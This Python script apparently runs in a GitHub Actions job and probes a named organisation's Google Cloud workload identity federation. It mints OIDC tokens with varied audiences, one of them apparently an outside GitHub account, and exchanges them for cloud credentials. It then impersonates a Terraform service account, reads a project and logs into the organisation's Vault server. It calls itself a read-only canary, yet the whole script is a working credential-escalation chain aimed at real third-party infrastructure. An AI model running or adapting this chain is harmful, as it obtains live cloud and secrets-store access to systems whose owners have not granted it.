#!/usr/bin/env python3
"""No-secret GitHub OIDC authorization canary for an owned repository.
Prints claims and status/error text only; never prints issued credentials."""
import base64, json, os, time, urllib.parse, urllib.request, urllib.error

PROVIDER = "projects/1051872707719/locations/global/workloadIdentityPools/terraform-github/providers/terraform"
AUD = "//iam.googleapis.com/" + PROVIDER
SA = "automated-terraform@services-254021.iam.gserviceaccount.com"
VAULT = "https://vault.goval.replit.com"

def request(url, method="GET", headers=None, obj=None):
    data = None if obj is None else json.dumps(obj).encode()
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            raw=r.read(); return r.status, json.loads(raw) if raw else {}
    except urllib.error.HTTPError as e:
        raw=e.read()
        try: body=json.loads(raw)
        except Exception: body={"body":raw.decode(errors="replace")[:1000]}
        return e.code, body

def b64json(part):
    return json.loads(base64.urlsafe_b64decode(part + "="*(-len(part)%4)))

def errtext(x):
    if not isinstance(x,dict): return str(x)[:1000]
    e=x.get("error",x)
    if isinstance(e,dict): return json.dumps({k:e.get(k) for k in ("code","status","message") if e.get(k) is not None},sort_keys=True)[:1000]
    return str(x.get("error_description",e))[:1000]

# Mint legitimate GitHub tokens and audit exact audience handling.
base=os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
sep="&" if "?" in base else "?"
cases=[
    ("exact", AUD, AUD),
    ("token_aud_github", "https://github.com/ikow", AUD),
    ("token_aud_vault", "vault/terraform", AUD),
    ("sts_aud_missing_prefix", AUD, PROVIDER),
]
fed=None
for name,token_aud,sts_aud in cases:
    url=base+sep+"audience="+urllib.parse.quote(token_aud,safe="")
    status, body=request(url,headers={"Authorization":"Bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
    print(f"oidc_{name}_status=",status)
    if status != 200:
        print(f"oidc_{name}_error=",errtext(body)); continue
    jwt=body["value"]
    claims=b64json(jwt.split('.')[1])
    keep=("iss","aud","sub","repository","repository_id","repository_owner","repository_owner_id","ref","ref_type","environment","workflow","workflow_ref","workflow_sha","job_workflow_ref","job_workflow_sha","event_name","actor","actor_id","head_ref","base_ref","runner_environment")
    print(f"oidc_{name}_claims="+json.dumps({k:claims.get(k) for k in keep if k in claims},sort_keys=True))
    sts_body={"audience":sts_aud,"grantType":"urn:ietf:params:oauth:grant-type:token-exchange","requestedTokenType":"urn:ietf:params:oauth:token-type:access_token","scope":"https://www.googleapis.com/auth/cloud-platform","subjectTokenType":"urn:ietf:params:oauth:token-type:jwt","subjectToken":jwt}
    status, sts=request("https://sts.googleapis.com/v1/token",method="POST",headers={"Content-Type":"application/json"},obj=sts_body)
    print(f"sts_{name}_status=",status,f"sts_{name}_result=",("token_issued" if status==200 and sts.get("access_token") else errtext(sts)))
    if name == "exact" and status==200 and sts.get("access_token"): fed=sts["access_token"]
if not fed: raise SystemExit(0)

# Canary the provider principal's service-account delegation; do not call any write API.
imp_url="https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/"+urllib.parse.quote(SA,safe="")+":generateAccessToken"
status, imp=request(imp_url,method="POST",headers={"Authorization":"Bearer "+fed,"Content-Type":"application/json"},obj={"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"600s"})
print("impersonation_status=",status,"impersonation_result=",("token_issued" if status==200 and imp.get("accessToken") else errtext(imp)))
if status != 200 or not imp.get("accessToken"): raise SystemExit(0)
sa_token=imp["accessToken"]

# Read-only identity/project canaries.
status, ti=request("https://oauth2.googleapis.com/tokeninfo?access_token="+urllib.parse.quote(sa_token,safe=""))
print("tokeninfo_status=",status,"tokeninfo_identity=",json.dumps({k:ti.get(k) for k in ("email","scope","expires_in") if k in ti},sort_keys=True) if status==200 else errtext(ti))
status, proj=request("https://cloudresourcemanager.googleapis.com/v1/projects/replit-web",headers={"Authorization":"Bearer "+sa_token})
print("project_get_status=",status,"project_result=",json.dumps({k:proj.get(k) for k in ("projectId","projectNumber","lifecycleState") if k in proj},sort_keys=True) if status==200 else errtext(proj))

# Reproduce Vault's GCP IAM login without printing either signed JWT or Vault token.
payload=json.dumps({"sub":SA,"aud":"vault/terraform","exp":int(time.time())+600}).encode()
sign_url="https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/"+urllib.parse.quote(SA,safe="")+":signJwt"
status, signed=request(sign_url,method="POST",headers={"Authorization":"Bearer "+sa_token,"Content-Type":"application/json"},obj={"payload":base64.b64encode(payload).decode()})
print("signjwt_status=",status,"signjwt_result=",("jwt_signed" if status==200 and signed.get("signedJwt") else errtext(signed)))
if status != 200 or not signed.get("signedJwt"): raise SystemExit(0)
status, vault=request(VAULT+"/v1/auth/gcp/login",method="POST",headers={"Content-Type":"application/json"},obj={"role":"terraform","jwt":signed["signedJwt"]})
auth=vault.get("auth",{}) if isinstance(vault,dict) else {}
print("vault_login_status=",status,"vault_result=",json.dumps({"authenticated":bool(auth.get("client_token")),"policies":auth.get("policies"),"lease_duration":auth.get("lease_duration"),"renewable":auth.get("renewable")},sort_keys=True) if status==200 else errtext(vault))
